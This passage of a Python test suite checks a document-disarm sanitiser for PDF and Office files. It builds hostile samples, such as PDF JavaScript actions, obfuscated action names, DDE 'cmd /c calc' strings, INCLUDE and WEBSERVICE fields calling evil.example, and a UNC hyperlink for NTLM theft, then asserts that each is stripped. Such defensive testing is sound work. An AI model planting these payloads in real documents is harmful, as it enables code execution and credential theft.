        item = pdf.make_indirect(pikepdf.Dictionary(
            Title=pikepdf.String("Click me"),
            A=pikepdf.Dictionary(S=pikepdf.Name("/JavaScript"),
                                 JS=pikepdf.String("app.alert('x')")),
        ))
        pdf.Root["/Outlines"] = pikepdf.Dictionary(
            Type=pikepdf.Name("/Outlines"), First=item, Last=item, Count=1)
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def test_pdf_outline_action_stripped(self):
        """Bookmark (/Outlines) item /A JavaScript fires on click and was never swept (M3)."""
        clean, report = cdr.cdr_pdf(self._pdf_with_outline_action())
        with pikepdf.open(io.BytesIO(clean)) as out:
            outlines = out.Root.get("/Outlines")
            if outlines is not None:
                node = outlines.get("/First")
                if node is not None:
                    assert "/A" not in node, "outline action survived"
        assert any("outline" in r for r in report["removed"])

    # ── Audit fix: a fixed recursion-depth cutoff silently stopped the outline sweep
    #    partway through a legitimately deep (non-cyclic) /Next chain, leaving deeper
    #    nodes' /A un-stripped while returning normally. The walk is now iterative and
    #    must fully sweep chains far deeper than the old depth cutoff (1000) ──
    def test_pdf_deep_noncyclic_outline_chain_fully_swept(self):
        pdf = pikepdf.Pdf.new()
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"), MediaBox=pikepdf.Array([0, 0, 612, 792]),
        ))
        pdf.pages.append(pikepdf.Page(page))

        depth = 5000
        first = None
        prev = None
        for i in range(depth):
            item = pdf.make_indirect(pikepdf.Dictionary(
                Title=pikepdf.String(f"item{i}"),
                A=pikepdf.Dictionary(S=pikepdf.Name("/JavaScript"),
                                     JS=pikepdf.String("app.alert('x')")),
            ))
            if prev is not None:
                prev["/Next"] = item
            else:
                first = item
            prev = item
        pdf.Root["/Outlines"] = pikepdf.Dictionary(
            Type=pikepdf.Name("/Outlines"), First=first, Last=prev, Count=depth)
        buf = io.BytesIO()
        pdf.save(buf)
        buf.seek(0)

        with pikepdf.open(buf) as out:
            removed = cdr._strip_pdf_outlines(out.Root)
        assert len(removed) == depth, \
            f"only {len(removed)}/{depth} outline nodes swept — deep chain silently truncated"

    def _outline_chain_pdf(self, depth):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        first = None
        prev = None
        for i in range(depth):
            item = pdf.make_indirect(pikepdf.Dictionary(
                Title=pikepdf.String(f"item{i}"),
                A=pikepdf.Dictionary(S=pikepdf.Name("/JavaScript"),
                                     JS=pikepdf.String("app.alert('CAPTAIL')")),
            ))
            if prev is not None:
                prev["/Next"] = item
            else:
                first = item
            prev = item
        pdf.Root["/Outlines"] = pikepdf.Dictionary(
            Type=pikepdf.Name("/Outlines"), First=first, Last=prev, Count=depth)
        buf = io.BytesIO()
        pdf.save(buf, compress_streams=False)
        return buf.getvalue()

    # ── Audit fix: the outline cap `continue`d, draining the stack without examining it,
    #    so outline items past the cap kept their /A /AA and cdr_pdf still returned a
    #    "sanitised" file. Node count is attacker-controlled (a 100_002-node outline tree
    #    is ~12 MB, far under _MAX_FILE_BYTES) — the cap must fail closed (pitfall #59) ──
    def test_outline_walk_cap_rejects_rather_than_truncating(self, monkeypatch):
        monkeypatch.setattr(cdr, "_MAX_WALK_NODES", 10)
        raw = self._outline_chain_pdf(40)
        assert b"CAPTAIL" in raw  # precondition: payload really is in the input
        with pytest.raises(cdr.CdrReject, match="walk cap"):
            cdr.cdr_pdf(raw)

    def test_outline_walk_cap_payload_never_ships(self, monkeypatch):
        """Pins the outcome, not the exception: an over-cap outline tree must never reach
        the sanitised bucket with live actions, whatever path replaces CdrReject."""
        monkeypatch.setattr(cdr, "_MAX_WALK_NODES", 10)
        raw = self._outline_chain_pdf(40)
        try:
            clean, _ = cdr.cdr_pdf(raw)
        except cdr.CdrReject:
            return
        assert b"CAPTAIL" not in clean, \
            "over-cap outline actions survived into the sanitised output"

    def test_pdf_goToE_annotation_action_stripped(self):
        """/GoToE (re-reaches embedded files) was not in the old denylist; the new
        unconditional /A deletion catches it (M4)."""
        pdf = pikepdf.Pdf.new()
        annot = pikepdf.Dictionary(
            Type=pikepdf.Name("/Annot"), Subtype=pikepdf.Name("/Link"),
            A=pikepdf.Dictionary(S=pikepdf.Name("/GoToE")),
        )
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"), MediaBox=pikepdf.Array([0, 0, 612, 792]),
            Annots=pikepdf.Array([annot]),
        ))
        pdf.pages.append(pikepdf.Page(page))
        buf = io.BytesIO()
        pdf.save(buf)
        clean, _ = cdr.cdr_pdf(buf.getvalue())
        with pikepdf.open(io.BytesIO(clean)) as out:
            for a in out.pages[0].get("/Annots", []):
                assert "/A" not in a

    def test_pdf_richmedia_annotation_neutralised(self):
        """/RichMedia annotation payload lives in /RichMediaContent — subtype neutralised
        and content dropped (M4)."""
        pdf = pikepdf.Pdf.new()
        annot = pikepdf.Dictionary(
            Type=pikepdf.Name("/Annot"), Subtype=pikepdf.Name("/RichMedia"),
            RichMediaContent=pikepdf.Dictionary(),
        )
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"), MediaBox=pikepdf.Array([0, 0, 612, 792]),
            Annots=pikepdf.Array([annot]),
        ))
        pdf.pages.append(pikepdf.Page(page))
        buf = io.BytesIO()
        pdf.save(buf)
        clean, report = cdr.cdr_pdf(buf.getvalue())
        with pikepdf.open(io.BytesIO(clean)) as out:
            for a in out.pages[0].get("/Annots", []):
                assert a.get("/Subtype") != "/RichMedia"
                assert "/RichMediaContent" not in a
        assert any("multimedia" in r for r in report["removed"])

    def test_webextension_parts_dropped(self):
        """Office Web Add-in (task pane) parts auto-load remote code — drop them (LOW)."""
        data = self._office_zip({
            "word/document.xml": b"<document/>",
            "word/webextensions/taskpanes.xml": b"<wetp:taskpanes/>",
            "word/webextensions/webextension1.xml": b'<we:webextension/>',
        })
        clean, report = cdr.cdr_office(data, "docx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("webextensions" in n.lower() for n in z.namelist())
        assert any("webextensions" in r.lower() for r in report["removed"])

    def test_dde_false_positive_benign_text_preserved(self):
        """Benign prose like 'Profit|Loss!Important' (pipe + word, not a cell ref) must
        NOT be corrupted to an unbalanced _CDR_REMOVED_( (L4)."""
        xml = b"<w:t>Profit|Loss!Important budget review</w:t>"
        clean, removed = cdr._strip_xml_macros(xml, "document.xml")
        assert clean == xml
        assert removed == []

    def test_dde_real_cell_ref_still_neutralised(self):
        """A genuine DDE pipe link targeting a cell ref must still be caught (L4)."""
        for payload in (
            b"<w:t>cmd| ' /c calc'!A1</w:t>",
            b"<w:t>app|topic!$B$2</w:t>",
            b"<w:t>x|y!R1C1</w:t>",
        ):
            clean, removed = cdr._strip_xml_macros(payload, "document.xml")
            assert b"_CDR_REMOVED_" in clean, f"not neutralised: {payload!r}"
            assert len(removed) > 0


class TestStripXmlMacrosRegex:
    """Regression tests for _strip_xml_macros edge cases."""

    def test_onclick_double_quoted_stripped(self):
        xml = b'<w:r onClick="runMacro()">text</w:r>'
        clean, removed = cdr._strip_xml_macros(xml, "test.xml")
        assert b'onClick' not in clean
        assert len(removed) > 0

    def test_onclick_single_quoted_stripped(self):
        """Single-quoted attribute values must be stripped — the old regex using [^\2]
        only matched the literal STX character, not the closing quote."""
        xml = b"<w:r onClick='runMacro()'>text</w:r>"
        clean, removed = cdr._strip_xml_macros(xml, "test.xml")
        assert b'onClick' not in clean
        assert len(removed) > 0

    def test_action_attribute_with_url_stripped(self):
        xml = b'<a:ext onAction="http://evil.example/x">click</a:ext>'
        clean, removed = cdr._strip_xml_macros(xml, "slide.xml")
        assert b'onAction' not in clean

    def test_safe_xml_unmodified(self):
        xml = b'<w:r w:rsidR="001A2B3C"><w:t>Hello</w:t></w:r>'
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert removed == []
        assert clean == xml

    def test_autoopen_neutralised(self):
        """AUTOOPEN has no argument — the name itself is suffixed with _CDR_REMOVED_."""
        xml = b'<w:instrText> AUTOOPEN </w:instrText>'
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert b'AUTOOPEN_CDR_REMOVED_' in clean
        assert b'AUTOOPEN ' not in clean  # bare AUTOOPEN gone
        assert len(removed) > 0

    def test_autoexit_autonew_autoclose_neutralised(self):
        for name in (b"AUTOEXIT", b"AUTONEW", b"AUTOCLOSE"):
            xml = b'<w:instrText> ' + name + b' SomeMacro </w:instrText>'
            clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
            assert name + b"_CDR_REMOVED_" in clean, f"{name!r} not neutralised"
            assert len(removed) > 0

    def test_include_field_neutralised(self):
        """INCLUDE fetches external files — the target path is neutralised."""
        xml = b'<w:instrText> INCLUDE \\\\server\\share\\evil.docx </w:instrText>'
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert b'INCLUDE _CDR_REMOVED_' in clean
        assert len(removed) > 0

    def test_includetext_includepicture_link_neutralised(self):
        for field in (b"INCLUDETEXT", b"INCLUDEPICTURE", b"LINK"):
            xml = b'<w:instrText> ' + field + b' http://evil.example/x </w:instrText>'
            clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
            assert field + b" _CDR_REMOVED_" in clean, f"{field!r} not neutralised"
            assert len(removed) > 0

    def test_automobile_not_matched(self):
        """'automobile' must not match the AUTO pattern — word boundary is required."""
        xml = b'<w:t>I drive an automobile</w:t>'
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert removed == []
        assert clean == xml

    def test_field_keyword_in_markup_not_corrupted(self):
        """Regression: field keywords appearing inside element/attribute NAMES (not inside a
        field carrier) must NOT be scrubbed — the old raw-XML scan emitted a value-less
        `_CDR_REMOVED_` token there, producing invalid XML (the styles.xml prod bug)."""
        # Mimics python-docx-authored styles.xml shapes: 'link', 'autoRedefine', etc. as
        # element/attribute names. None of these are field carriers.
        xml = (b'<w:style w:type="paragraph"><w:name w:val="heading 1"/>'
               b'<w:link w:val="Heading1Char"/><w:autoRedefine/>'
               b'<w:rPr><w:rFonts w:hAnsi="Calibri Light"/></w:rPr></w:style>')
        clean, removed = cdr._strip_xml_macros(xml, "word/styles.xml")
        assert clean == xml, "benign markup must pass through byte-for-byte"
        assert removed == []
        assert b"_CDR_REMOVED_" not in clean

    def test_fldsimple_instr_attribute_neutralised(self):
        """The fldSimple instruction-attribute carrier form is also scrubbed."""
        xml = b'<w:fldSimple w:instr=" INCLUDETEXT http://evil.example/x "><w:r/></w:fldSimple>'
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert b"INCLUDETEXT _CDR_REMOVED_" in clean
        assert b"evil.example" not in clean
        assert len(removed) > 0

    def test_webservice_no_parens_neutralised(self):
        """WEBSERVICE Word field form (no parentheses) fetches URLs on open — must be caught."""
        xml = b'<w:instrText> WEBSERVICE "http://evil.example/exfil" </w:instrText>'
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert b'WEBSERVICE _CDR_REMOVED_' in clean
        assert b'evil.example' not in clean
        assert len(removed) > 0

    def test_hyperlink_no_parens_neutralised(self):
        """HYPERLINK Word field form (no parentheses) with UNC path triggers NTLM theft."""
        xml = b'<w:instrText> HYPERLINK "\\\\evil-server\\share\\file" </w:instrText>'
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert b'HYPERLINK _CDR_REMOVED_' in clean
        assert b'evil-server' not in clean
        assert len(removed) > 0

    def test_xml_entity_encoded_dde_neutralised(self):
        """&#68;&#68;&#69; is entity-encoded 'DDE' — must be decoded and caught before regex."""
        xml = '&#68;&#68;&#69; http://evil.example'.encode()
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        # The entity-encoded keyword run is neutralised in place; the literal 'DDE'
        # keyword never appears in the output (encoded form fully replaced), and the
        # benign URL text is preserved.
        assert b'_CDR_REMOVED_' in clean
        assert b'DDE' not in clean
        assert b'http://evil.example' in clean
        assert len(removed) > 0

    def test_benign_xml_escape_preserved(self):
        """Legitimate &amp; in content must survive — not be decoded into invalid XML."""
        xml = '<w:t>AT&amp;T contract</w:t>'.encode()
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert b'AT&amp;T contract' in clean
        assert removed == []

    def test_xml_entity_encoded_macrobutton_neutralised(self):
        """&#77;ACROBUTTON (partial entity encoding) is decoded before regex match."""
        # &#77; = 'M', so this is 'MACROBUTTON'
        xml = '&#77;ACROBUTTON HiddenButton Click'.encode()
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert b'MACROBUTTON HiddenButton' not in clean
        assert len(removed) > 0

    def test_dde_pipe_quoted_app_name_neutralised(self):
        """DDE pipe form with a quoted/bracketed app name must be neutralised — the old
        regex excluded quotes/brackets before the pipe, allowing a trivial bypass."""
        for payload in (
            b'<w:t>"cmd"| \' /c calc\'!A1</w:t>',
            b"<w:t>'cmd'| ' /c calc'!A1</w:t>",
            b'<w:t>[cmd]| \' /c calc\'!A1</w:t>',
            b'<w:t>cmd| \' /c calc\'!A1</w:t>',
        ):
            clean, removed = cdr._strip_xml_macros(payload, "sheet.xml")
            assert b'_CDR_REMOVED_' in clean, f"not neutralised: {payload!r}"
            assert b'!A1' not in clean, f"DDE target survived: {payload!r}"
            assert len(removed) > 0

    def test_many_unterminated_instrtext_does_not_hang(self):
        """Audit fix: a document.xml with many unmatched "<w:instrText ...>" opens used to
        cost O(n^2) (a lazy DOTALL body group re-scans to EOF for every unmatched open) —
        well within the 200MB per-entry limit, this was a Lambda-timeout DoS. Must now
        complete in well under a second for tens of thousands of unmatched opens."""
        xml = ("<w:instrText>" * 40_000).encode() + b"X" * 1000
        start = time.time()
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        elapsed = time.time() - start
        assert elapsed < 2.0, f"took {elapsed:.2f}s — quadratic blowup regressed"
        assert removed == []  # no complete instrText element, nothing to scrub


class TestEncTag:
    """_enc_tag reduces a string to S3's allowed tag character set (NOT percent-encoding —
    S3 rejects '%' as InvalidTag) and caps length. Regression for the live InvalidTag /
    InvalidArgument failures where a ZIP-anomaly reason (containing quotes/colons/'=') sank
    the quarantine write. S3 allows letters/digits/spaces and + - . _ : / @ in a value;
    '=' and '&' are excluded because they are the Tagging query-string separators."""

    def test_short_value_unchanged(self):
        assert cdr._enc_tag("rejected", 256) == "rejected"

    def test_no_percent_encoding(self):
        # Must NOT percent-encode — S3 rejects '%'. Disallowed chars become '_'.
        out = cdr._enc_tag("duplicate ZIP entry: 'word/document.xml'", 256)
        assert "%" not in out
        assert "'" not in out                 # quote → '_'
        assert "ZIP entry: " in out           # safe chars (space, colon) preserved
        assert "word/document.xml" in out     # '/' and '.' are S3-safe

    def test_separators_and_injection_neutralised(self):
        # '&' and '=' (Tagging separators) must not survive — else a filename could inject
        # extra tag pairs or break parsing.
        out = cdr._enc_tag("evil&cdr-status=clean=injection", 256)
        assert "&" not in out and "=" not in out

    def test_length_capped(self):
        out = cdr._enc_tag("reason " + "x" * 500, 256)
        assert len(out) <= 256

    def test_s3_safe_chars_preserved(self):
        ok = "abcXYZ 012 +-._:/@"
        assert cdr._enc_tag(ok, 256) == ok


class TestTruncateRemoved:
    """_truncate_removed caps 'removed' lists at 100 entries at both nesting levels."""

    def test_flat_removed_truncated(self):
        report = {"removed": [f"entry{i}" for i in range(200)], "format": "xlsx"}
        result = cdr._truncate_removed(report)
        assert len(result["removed"]) == 101
        assert "and 100 more" in result["removed"][-1]

    def test_nested_report_removed_truncated(self):
        inner = {"removed": [f"e{i}" for i in range(150)]}
        report = {"original_ext": "docx", "report": inner}
        result = cdr._truncate_removed(report)
        assert len(result["report"]["removed"]) == 101
        assert "and 50 more" in result["report"]["removed"][-1]

    def test_short_list_unchanged(self):
        report = {"removed": ["entry1", "entry2"], "report": {"removed": ["r1"]}}
        result = cdr._truncate_removed(report)
        assert result["removed"] == ["entry1", "entry2"]
        assert result["report"]["removed"] == ["r1"]

    def test_flat_report_without_removed_unchanged(self):
        report = {"reason": "file too large", "size": 999}
        result = cdr._truncate_removed(report)
        assert result == {"reason": "file too large", "size": 999}

    def test_large_entry_names_bounded_by_bytes(self):
        # 50 entries, each a 20 KB attacker-controlled name → 1 MB total, well over the
        # 256 KB SNS limit even though the count (50) is under the 100-entry cap.
        big = "A" * 20_000
        report = {"removed": [f"{big}{i}" for i in range(50)], "format": "xlsx"}
        result = cdr._truncate_removed(report)
        serialised = len(__import__("json").dumps(result["removed"]))
        assert serialised <= cdr._SNS_REMOVED_BYTE_BUDGET
        assert "truncated" in result["removed"][-1]
        assert len(result["removed"]) < 50

    def test_nested_large_entry_names_bounded_by_bytes(self):
        big = "B" * 20_000
        report = {"report": {"removed": [f"{big}{i}" for i in range(50)]}}
        result = cdr._truncate_removed(report)
        serialised = len(__import__("json").dumps(result["report"]["removed"]))
        assert serialised <= cdr._SNS_REMOVED_BYTE_BUDGET
        assert "truncated" in result["report"]["removed"][-1]


class TestVbaProjectOpenxmlNamespace:
    """Regression: real-world macro docs (LibreOffice / python-docx authored) emit the
    vbaProject relationship under the openxmlformats.org officeDocument/2006 namespace,
    not the microsoft.com office/2006 one. Both must be stripped; otherwise the rel and
    the /word/vbaProject.bin content-type Override dangle at the removed part and a strict
    OPC consumer (python-docx, Word) rejects the reconstructed file with
    "There is no item named 'word/vbaProject.bin' in the archive"."""

    def _make_docm_openxml_vba(self) -> bytes:
        ns_pkg = "http://schemas.openxmlformats.org/package/2006/relationships"
        # NOTE: openxmlformats namespace, not microsoft.com — this is the form that escaped CDR.
        vba_rel = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/vbaProject"
        rels_xml = (
            f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            f'<Relationships xmlns="{ns_pkg}">'
            f'<Relationship Id="rId1" Type="{vba_rel}" Target="vbaProject.bin"/>'
            f'</Relationships>'
        )
        ct_xml = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
            '<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
            '<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>'
            '</Types>'
        )
        doc_xml = (
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            '<w:body><w:p><w:r><w:t>hello</w:t></w:r></w:p></w:body></w:document>'
        )
        root_rels = (
            f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            f'<Relationships xmlns="{ns_pkg}">'
            f'<Relationship Id="rIdMain"'
            f' Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"'
            f' Target="word/document.xml"/>'
            f'</Relationships>'
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", ct_xml)
            z.writestr("_rels/.rels", root_rels)
            z.writestr("word/_rels/document.xml.rels", rels_xml)
            z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO_PAYLOAD")
            z.writestr("word/document.xml", doc_xml)
        return buf.getvalue()

    def test_openxml_vba_rel_and_override_stripped(self):
        clean, report = cdr.cdr_office(self._make_docm_openxml_vba(), "docm")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names    = [n.lower() for n in z.namelist()]
            ct_xml   = z.read("[Content_Types].xml").decode()
            rels_xml = z.read("word/_rels/document.xml.rels").decode()
        assert not any("vbaproject.bin" in n for n in names), "VBA part still present"
        assert "vbaProject" not in rels_xml, "openxmlformats vbaProject rel not stripped"
        assert "vbaProject" not in ct_xml, "vbaProject content-type (Default/Override) not removed"
        assert any("vbaProject" in r for r in report["removed"]), "rel removal not reported"

    def test_sanitised_docm_opens_in_python_docx(self):
        clean, _ = cdr.cdr_office(self._make_docm_openxml_vba(), "docm")
        docx = pytest.importorskip("docx")
        doc = docx.Document(io.BytesIO(clean))
        # Was: ValueError "There is no item named 'word/vbaProject.bin' in the archive".
        assert [p.text for p in doc.paragraphs] == ["hello"]


class TestRelLocalNameMatching:
    """The CDR rel-strip matches by namespace-independent LOCAL NAME (_rel_local), so the
    same logical relationship is stripped regardless of which interchangeable namespace a
    producer emits it under — transitional (openxmlformats), Microsoft (schemas.microsoft.com,
    incl. 2019/04 long-path), and ISO/IEC-29500 Strict (purl.oclc.org). Regression coverage
    for the gateway rel-namespace audit (2026-06-22): closes the dual-namespace bug class and
    the stripped-part/surviving-rel dangling-rel class."""

    NS = "http://schemas.openxmlformats.org/package/2006/relationships"

    def _rels(self, *pairs) -> bytes:
        rels = "".join(
            f'<Relationship Id="rId{i}" Type="{t}" Target="{tgt}"/>'
            for i, (t, tgt) in enumerate(pairs, 1)
        )
        return (f'<?xml version="1.0"?><Relationships xmlns="{self.NS}">{rels}'
                f'</Relationships>').encode()

    def test_localname_set_has_no_missing_audit_names(self):
        need = {
            "vbaproject", "oleobject", "externallink", "externallinkpath", "afchunk",
            "customxml", "customxmlprops", "xlmacrosheet", "xlintlmacrosheet", "tags",
            "activexcontrolbinary", "externallinklongpath", "oleobjectlinklongpath",
            "xlstartup", "xlalternatestartup", "xlpathmissing", "xllibrary", "control",
            "package", "attachedtemplate", "subdocument", "frame", "querytable",
            "connections", "attachedtoolbars", "webextension", "webextensiontaskpanes",
        }
        assert need <= cdr.STRIP_REL_LOCALNAMES, need - cdr.STRIP_REL_LOCALNAMES

    def test_hyperlink_not_in_strip_localnames(self):
        # Hyperlinks are neutralised in place, never stripped — must NOT be in the set.
        assert cdr.HYPERLINK_REL_LOCALNAME not in cdr.STRIP_REL_LOCALNAMES

    def test_strict_namespace_vbaproject_stripped(self):
        # ISO Strict (purl.oclc.org) sibling of the vbaProject rel — previously survived.
        rels = self._rels((
            "http://purl.oclc.org/ooxml/officeDocument/relationships/vbaProject",
            "vbaProject.bin",
        ))
        clean, removed = cdr._strip_rels(rels)
        assert "vbaProject".lower() not in clean.decode().lower()
        assert any("vbaproject" in r.lower() for r in removed)

    def test_standard_lowercase_afchunk_stripped(self):
        # Word emits aFChunk (capital F); the ISO standard mandates afChunk (lowercase).
        # The altChunk active-content vector must strip under BOTH spellings.
        for tail in ("aFChunk", "afChunk"):
            rels = self._rels((
                f"http://schemas.openxmlformats.org/officeDocument/2006/relationships/{tail}",
                "afchunk/import1.html",
            ))
            clean, removed = cdr._strip_rels(rels)
            assert removed, f"{tail} not stripped"
            assert "Relationship Id" not in clean.decode(), f"{tail} rel survived"

    def test_xl_macrosheet_rel_stripped(self):
        rels = self._rels((
            "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet",
            "macrosheets/sheet1.xml",
        ), (
            "http://schemas.microsoft.com/office/2006/relationships/xlIntlMacrosheet",
            "macrosheets/intlsheet1.xml",
        ))
        clean, removed = cdr._strip_rels(rels)
        assert "Relationship Id" not in clean.decode(), "macrosheet rels survived"
        assert len(removed) == 2

    def test_ppt_tags_rel_stripped(self):
        rels = self._rels((
            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags",
            "tags/tag1.xml",
        ))
        clean, removed = cdr._strip_rels(rels)
        assert "Relationship Id" not in clean.decode(), "tags rel survived"
        assert removed

    def test_activex_control_binary_rel_stripped(self):
        rels = self._rels((
            "http://schemas.microsoft.com/office/2006/relationships/activeXControlBinary",
            "activeX1.bin",
        ))
        clean, removed = cdr._strip_rels(rels)
        assert "Relationship Id" not in clean.decode(), "activeXControlBinary rel survived"
        assert removed

    def test_excel_longpath_external_and_ole_rels_stripped(self):
        rels = self._rels(
            ("http://schemas.microsoft.com/office/2019/04/relationships/externalLinkLongPath",
             "externalLinks/externalLink1.xml"),
            ("http://schemas.microsoft.com/office/2019/04/relationships/oleObjectLinkLongPath",
             "embeddings/oleObject1.bin"),
            ("http://schemas.microsoft.com/office/2019/04/relationships/xlExternalLinkLongPath/xlStartup",
             "x"),
            ("http://schemas.microsoft.com/office/2009/04/relationships/xlExternalLinkLongPath/xlPathMissing",
             "y"),
        )
        clean, removed = cdr._strip_rels(rels)
        assert "Relationship Id" not in clean.decode(), "long-path rels survived"
        assert len(removed) == 4

    def test_hyperlink_still_neutralised_not_stripped(self):
        # Behaviour preservation: external hyperlink Target rewritten, rel KEPT.
        rels = self._rels((cdr.HYPERLINK_REL_TYPE, "https://evil.example/x"))
        # add TargetMode=External
        rels = rels.replace(b'Target="https://evil.example/x"',
                            b'Target="https://evil.example/x" TargetMode="External"')
        clean, removed = cdr._strip_rels(rels)
        decoded = clean.decode()
        assert "Relationship Id" in decoded, "hyperlink rel was wrongly stripped"
        assert "_CDR_REMOVED_" in decoded, "hyperlink target not neutralised"
        assert "evil.example" not in decoded


class TestStevensGapRegressions:
    """Regression coverage for the parser-strength PDF cases and ZIP-polyglot identified in
    docs/cdr-gap-analysis-stevens.md. These behaviours already work because cdr_pdf parses
    the object model (not string-scans) and cdr_office rebuilds the archive — these tests
    pin them so a future pikepdf/zipfile change can't silently regress them."""

    # ── PDF: JS hidden in an object stream (/ObjStm) ────────────────────────────
    def test_js_in_objstm_removed(self):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        js = pdf.make_indirect(pikepdf.Dictionary(
            S=pikepdf.Name("/JavaScript"), JS=pikepdf.String("app.alert('pwned');")))
        pdf.Root["/OpenAction"] = js
        buf = io.BytesIO()
        # Pack objects into a compressed object stream — the thing pdfid flags as /ObjStm.
        pdf.save(buf, object_stream_mode=pikepdf.ObjectStreamMode.generate)
        raw = buf.getvalue()
        assert b"/ObjStm" in raw  # precondition: the payload really is in an object stream

        clean, report = cdr.cdr_pdf(raw)
        assert b"app.alert" not in clean, "JS payload in /ObjStm survived CDR"
        assert b"/OpenAction" not in clean
        assert "/OpenAction" in report["removed"]

    # ── PDF: hex-obfuscated action name (/J#61vaScript == /JavaScript) ───────────
    def test_hex_obfuscated_name_action_removed(self):
        raw = (
            b"%PDF-1.7\n"
            b"1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 4 0 R>>endobj\n"
            b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
            b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\n"
            b"4 0 obj<</S/J#61vaScript/JS(app.alert\\('x'\\);)>>endobj\n"
            b"xref\n0 5\n0000000000 65535 f \n"
            b"trailer<</Root 1 0 R/Size 5>>\nstartxref\n0\n%%EOF"
        )
        clean, report = cdr.cdr_pdf(raw)
        assert b"app.alert" not in clean, "obfuscated-name JS action survived CDR"
        assert b"avaScript" not in clean and b"#61" not in clean
        assert "/OpenAction" in report["removed"]

    # ── PDF: encrypted with empty user password is disarmed (pikepdf opens it) ───
    def test_encrypted_empty_password_disarmed(self):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        pdf.Root["/OpenAction"] = pdf.make_indirect(pikepdf.Dictionary(
            S=pikepdf.Name("/JavaScript"), JS=pikepdf.String("app.alert('e');")))
        buf = io.BytesIO()
        pdf.save(buf, encryption=pikepdf.Encryption(owner="o", user="", R=4))
        clean, report = cdr.cdr_pdf(buf.getvalue())
        assert b"app.alert" not in clean
        assert "/OpenAction" in report["removed"]

    # ── PDF: unknown-password PDF fails closed (raises → handler quarantines) ────
    def test_unknown_password_pdf_raises(self):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        buf = io.BytesIO()
        pdf.save(buf, encryption=pikepdf.Encryption(owner="secret123", user="secret123", R=4))
        with pytest.raises(pikepdf.PasswordError):
            cdr.cdr_pdf(buf.getvalue())

    # ── PDF: JBIG2 / JPX decoder-RCE image filters are neutralised ──────────────
    def _pdf_with_image_filter(self, filter_name: str) -> bytes:
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        img = pdf.make_stream(
            b"\x00\x01\x02DECODERPAYLOAD",
            Type=pikepdf.Name("/XObject"), Subtype=pikepdf.Name("/Image"),
            Width=4, Height=4, BitsPerComponent=1,
            ColorSpace=pikepdf.Name("/DeviceGray"),
            Filter=pikepdf.Name(filter_name),
        )
        pdf.pages[0].Resources = pikepdf.Dictionary(
            XObject=pikepdf.Dictionary(Im0=img))
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def test_jbig2_image_filter_neutralised(self):
        raw = self._pdf_with_image_filter("/JBIG2Decode")
        assert b"/JBIG2Decode" in raw  # precondition
        clean, report = cdr.cdr_pdf(raw)
        assert b"/JBIG2Decode" not in clean, "JBIG2 filter survived CDR"
        assert b"DECODERPAYLOAD" not in clean, "JBIG2 stream payload survived CDR"
        assert any("risky image filter" in r for r in report["removed"])
        # output must still be a valid, openable PDF
        with pikepdf.open(io.BytesIO(clean)) as p:
            assert len(p.pages) == 1

    def test_jpx_image_filter_neutralised(self):
        raw = self._pdf_with_image_filter("/JPXDecode")
        clean, report = cdr.cdr_pdf(raw)
        assert b"/JPXDecode" not in clean, "JPX (JPEG2000) filter survived CDR"
        assert b"DECODERPAYLOAD" not in clean
        assert any("risky image filter" in r for r in report["removed"])

    def test_clean_pdf_has_no_risky_filter_removal(self):
        # A normal PDF (no JBIG2/JPX) must not trip the risky-filter sweep.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        buf = io.BytesIO()
        pdf.save(buf)
        clean, report = cdr.cdr_pdf(buf.getvalue())
        assert not any("risky image filter" in r for r in report["removed"])

    # ── Audit fix: inline-image JBIG2 in a content stream bypasses the object sweep
    #    (it lives in operator tokens, survives pdf.save) — must be hard-rejected ──
    def test_inline_image_jbig2_rejected(self):
